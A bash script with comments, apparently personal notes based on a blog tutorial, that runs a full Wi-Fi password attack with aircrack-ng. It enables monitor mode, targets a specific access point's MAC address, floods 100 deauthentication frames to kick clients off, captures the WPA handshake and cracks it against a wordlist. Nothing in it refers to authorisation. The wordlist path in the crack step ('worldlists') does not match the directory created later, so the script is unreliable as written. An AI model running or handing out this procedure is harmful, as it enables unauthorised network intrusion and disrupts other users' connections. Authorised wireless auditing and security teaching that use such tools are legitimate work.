#!/bin/bash
# https://blog.eldernode.com/aircrack-ng-on-ubuntu-20-10/

# install aircrack-ng
sudo apt install aircrack-ng

# list all the Wi-Fi cards connected to your system
# find the card name
iwconfig

# root@steve-OptiPlex-7050:~# iwconfig
# lo        no wireless extensions.

# enp0s31f6  no wireless extensions.

# wlxc4e9840d947d  IEEE 802.11  ESSID:off/any  
#           Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
#           Retry short limit:7   RTS thr:off   Fragment thr:off
#           Encryption key:off
          # Power Management:off

# Kill all running processes on the wireless card.
airmon-ng check kill

# Start monitor mode on wireless card
airmon-ng start wlxc4e9840d947d

# Get new card interface name (mine is `wlan0mon`)
iwconfig

# Use airodump-ng to see nearby wireless access points
airodump-ng wlan0mon

# Capture a handshake with the router by saving packets with `-write` option
# The handshake will contain the encrypted network password.

# Now you need to capture a handshake by saving packets.
# The handshake will contain the encrypted wifi password.
# --bssid (the Access Point's MAC Address you get from the previous airodump-ng command)
# -c (the Access Point's channel [1-13] get from previous command)
# --write (stores captured packets at a defined loocation)
airodump-ng --bssid 6C:B7:49:FC:62:E4   -c 11 wlan0mon --write /tmp/handshake.cap

# de-authenticate other devices from the Access Point using `aireplay-ng`
aireplay-ng -0 100 -a 6C:B7:49:FC:62:E4 wlan0mon

# Begin cracking password with your dictionary
aircrack-ng /tmp/handshake.cap-01.cap -w /usr/share/worldlists/name_of_your_dict.txt

# When you break your computer's network capability you can reset
airmon-ng stop wlan0mon
systemctl restart network-manager


# Now you need wordlist
mkdir -p /usr/share/wordlists/
# Add your dictionary to this directory.
# You could use `sort` and redirect to a new file to combine a bunch of dicts.
sort -u /path/to/files/* > combined_dict.txt
